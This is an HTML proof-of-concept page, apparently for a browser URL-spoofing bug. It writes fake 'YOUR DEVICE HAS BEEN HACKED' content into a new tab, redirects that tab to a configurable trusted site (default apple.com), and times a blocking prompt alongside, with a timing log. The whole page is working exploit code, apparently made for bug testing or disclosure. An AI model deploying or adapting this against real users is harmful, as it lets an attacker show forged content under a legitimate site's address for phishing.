<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>testertster - PoC Lab</title>
    <style>
      * {
        box-sizing: border-box;
      }
      body,
      html {
        margin: 0;
        padding: 0;
        min-height: 100%;
        background: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      }
      .center-stage {
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 16px;
        padding: 24px;
      }
      #startBtn {
        padding: 15px 30px;
        font-size: 18px;
        font-weight: 600;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
      }
      #startBtn:hover {
        background: #0063cc;
      }
      .controls {
        display: flex;
        flex-wrap: wrap;
        gap: 12px;
        align-items: center;
        justify-content: center;
        font-size: 13px;
        color: #333;
      }
      .controls label {
        display: inline-flex;
        align-items: center;
        gap: 6px;
      }
      .controls input {
        width: 76px;
        padding: 4px 6px;
        border: 1px solid #ccc;
        border-radius: 6px;
      }
      .log-box {
        width: 100%;
        max-width: 720px;
        background: #111827;
        color: #e5e7eb;
        border-radius: 10px;
        padding: 12px 14px;
        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: 12px;
        line-height: 1.5;
        max-height: 220px;
        overflow-y: auto;
      }
      .log-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 8px;
        font-size: 12px;
        color: #9ca3af;
      }
      .log-header button {
        background: #374151;
        color: #f9fafb;
        border: none;
        border-radius: 6px;
        padding: 4px 10px;
        cursor: pointer;
        font-size: 11px;
      }
    </style>
  </head>
  <body>
    <div class="center-stage">
      <div class="controls">
        <label>
          Redirect delay (ms):
          <input id="redirectDelay" type="number" value="1" min="0" step="1" />
        </label>
        <label>
          Prompt delay (ms):
          <input id="promptDelay" type="number" value="500" min="0" step="10" />
        </label>
        <label>
          Target URL:
          <input id="targetUrl" type="text" value="https://apple.com" style="width: 180px;" />
        </label>
      </div>

      <button id="startBtn">CLICK HERE</button>

      <div class="log-box" aria-live="polite">
        <div class="log-header">
          <span>Execution Timeline Log</span>
          <button id="clearLogBtn" type="button">Clear</button>
        </div>
        <div id="logEntries">Ready. Click "CLICK HERE" to run test sequence.</div>
      </div>
    </div>

    <script>
      (function () {
        const startBtn = document.getElementById("startBtn");
        const logEntries = document.getElementById("logEntries");
        const clearLogBtn = document.getElementById("clearLogBtn");
        let t0 = 0;
        let activeTab = null;
        let firstRun = true;

        function appendLog(msg) {
          const elapsed = t0 ? `+${(performance.now() - t0).toFixed(1)}ms` : "+0.0ms";
          if (firstRun) {
            logEntries.textContent = "";
            firstRun = false;
          }
          const line = document.createElement("div");
          line.textContent = `[${elapsed}] ${msg}`;
          logEntries.appendChild(line);
          logEntries.scrollTop = logEntries.scrollHeight;
        }

        clearLogBtn.addEventListener("click", function () {
          logEntries.textContent = "";
          firstRun = false;
          t0 = 0;
        });

        function buildTabHtml() {
          return `<!DOCTYPE html>
<html>
<head><title>testertester</title></head>
<body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:sans-serif">
  <div>
    <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT APPLE</h1>
    <p style="font-size:64px;font-weight:bold;color:#007aff;margin:20px 0">YOUR DEVICE HAS BEEN HACKED BY AZZA</p>
  </div>
</body>
</html>`;
        }

        startBtn.addEventListener("click", function () {
          t0 = performance.now();
          const redirectDelay = Math.max(0, Number(document.getElementById("redirectDelay").value) || 0);
          const promptDelay = Math.max(0, Number(document.getElementById("promptDelay").value) || 0);
          const targetUrl = document.getElementById("targetUrl").value.trim() || "https://apple.com";

          appendLog("Start button clicked.");
          this.remove();

          const newTab = window.open("about:blank", "_blank");
          activeTab = newTab;

          if (!newTab) {
            appendLog("window.open returned null (possibly blocked by popup blocker).");
          } else {
            appendLog("Opened new tab (about:blank). Writing initial content...");
            try {
              newTab.document.open();
              newTab.document.write(buildTabHtml());
              newTab.document.close();
              appendLog("Wrote and closed newTab document.");
            } catch (err) {
              appendLog("Error writing to newTab document: " + err.message);
            }

            setTimeout(function () {
              appendLog(`Redirect timer fired -> setting location.href to "${targetUrl}"`);
              try {
                if (!newTab.closed) {
                  newTab.location.href = targetUrl;
                } else {
                  appendLog("newTab was already closed before redirect.");
                }
              } catch (err) {
                appendLog("Error setting newTab.location.href: " + err.message);
              }
            }, redirectDelay);
          }

          setTimeout(function () {
            appendLog("Prompt timer fired -> opening prompt(\"ROOT CAUSE\").");
            const pwd = prompt("ROOT CAUSE");
            appendLog("Prompt closed. Returned value: " + (pwd === null ? "null (cancelled)" : JSON.stringify(pwd)));

            if (activeTab) {
              try {
                appendLog("activeTab.closed state after prompt: " + String(activeTab.closed));
              } catch (err) {
                appendLog("Unable to read activeTab.closed (cross-origin restriction): " + err.message);
              }
            }
          }, promptDelay);
        });
      })();
    </script>
  </body>
</html>
